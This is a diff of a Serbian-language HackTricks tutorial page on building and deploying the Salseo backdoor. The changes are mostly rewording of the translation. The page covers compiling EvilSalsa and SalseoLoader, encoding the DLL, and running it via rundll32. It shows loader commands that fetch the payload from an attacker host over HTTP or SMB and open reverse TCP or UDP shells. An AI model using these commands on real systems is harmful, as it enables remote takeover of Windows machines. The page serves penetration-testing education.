@@ -6,7 +6,7 @@
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
@@ -16,13 +16,13 @@ Drugi načini podrške HackTricks-u:
 
 ## Kompajliranje binarnih fajlova
 
-Preuzmite izvorni kod sa github-a i kompajlirajte **EvilSalsa** i **SalseoLoader**. Trebaće vam instaliran **Visual Studio** za kompajliranje koda.
+Preuzmite izvorni kod sa github-a i kompajlirajte **EvilSalsa** i **SalseoLoader**. Trebaće vam **Visual Studio** instaliran da biste kompajlirali kod.
 
-Kompajlirajte ove projekte za arhitekturu Windows sistema na kojem ćete ih koristiti (ako Windows podržava x64, kompajlirajte ih za tu arhitekturu).
+Kompajlirajte ove projekte za arhitekturu Windows sistema na kojem ćete ih koristiti (Ako Windows podržava x64, kompajlirajte ih za tu arhitekturu).
 
 Možete **izabrati arhitekturu** unutar Visual Studio-a u **levom "Build" Tab-u** u **"Platform Target".**
 
-(\*\*Ako ne možete pronaći ove opcije, kliknite na **"Project Tab"** a zatim na **"\<Project Name> Properties"**)
+(\*\*Ako ne možete pronaći ove opcije, pritisnite na **"Project Tab"** a zatim na **"\<Project Name> Properties"**)
 
 ![](<../.gitbook/assets/image (132).png>)
 
@@ -32,7 +32,7 @@ Zatim, izgradite oba projekta (Build -> Build Solution) (Unutar logova će se po
 
 ## Priprema Backdoor-a
 
-Prvo, moraćete da enkodujete **EvilSalsa.dll.** Za to možete koristiti python skriptu **encrypterassembly.py** ili možete kompajlirati projekat **EncrypterAssembly**:
+Prvo, trebaće vam da enkodujete **EvilSalsa.dll.** Da biste to uradili, možete koristiti python skriptu **encrypterassembly.py** ili možete kompajlirati projekat **EncrypterAssembly**:
 
 ### **Python**
 ```
@@ -52,13 +52,13 @@ Sada imate sve što vam je potrebno da izvršite ceo Salseo postupak: **enkodira
 
 ### **Dobijanje TCP reverznog shell-a (preuzimanje enkodiranog dll-a putem HTTP-a)**
 
-Zapamtite da pokrenete nc kao osluškivač reverznog shella i HTTP server kako biste poslužili enkodirani evilsalsa.
+Zapamtite da pokrenete nc kao osluškivač reverznog shella i HTTP server da poslužuje enkodirani evilsalsa.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
-### **Dobijanje UDP obrnutog školjka (preuzimanje enkodiranog dll-a putem SMB-a)**
+### **Dobijanje UDP obrnutog školjka (preuzimanje enkodovanog dll-a preko SMB-a)**
 
-Zapamtite da pokrenete nc kao osluškivač obrnutog školjka, i SMB server da posluži enkodirani evilsalsa (impacket-smbserver).
+Zapamtite da treba pokrenuti nc kao osluškivač obrnutog školjka, i SMB server da služi enkodovani evilsalsa (impacket-smbserver).
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
@@ -87,23 +87,23 @@ Otvorite projekat SalseoLoader koristeći Visual Studio.
 
 ### Dodajte pre glavne funkcije: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Instalirajte DllExport za ovaj projekat
 
 #### **Alati** --> **NuGet Package Manager** --> **Upravljanje NuGet paketima za rešenje...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **Pretražite DllExport paket (koristeći karticu Browse), i pritisnite Instaliraj (i prihvatite iskačući prozor)**
+#### **Pretražite DllExport paket (koristeći karticu Pretraži) i pritisnite Instaliraj (i prihvatite iskačući prozor)**
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-U vašem projekt folderu pojaviće se fajlovi: **DllExport.bat** i **DllExport\_Configure.bat**
+U vašem projekt folderu pojavili su se fajlovi: **DllExport.bat** i **DllExport\_Configure.bat**
 
 ### **De**instalirajte DllExport
 
-Pritisnite **Deinstaliraj** (da, čudno je ali verujte mi, neophodno je)
+Pritisnite **Deinstaliraj** (da, čudno je, ali verujte mi, neophodno je)
 
 ![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)
 
@@ -113,7 +113,7 @@ Jednostavno **izađite** iz Visual Studio-a
 
 Zatim, idite u vaš **SalseoLoader folder** i **izvršite DllExport\_Configure.bat**
 
-Izaberite **x64** (ako ćete ga koristiti unutar x64 okruženja, to je bio moj slučaj), izaberite **System.Runtime.InteropServices** (unutar **Namespace for DllExport**) i pritisnite **Primeni**
+Izaberite **x64** (ako ćete ga koristiti unutar x64 okvira, to je bio moj slučaj), izaberite **System.Runtime.InteropServices** (unutar **Namespace for DllExport**) i pritisnite **Primeni**
 
 ![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)
 
@@ -175,7 +175,7 @@ rundll32.exe SalseoLoader.dll,main
 
 Drugi načini da podržite HackTricks:
 
-* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJEM**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJEM**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
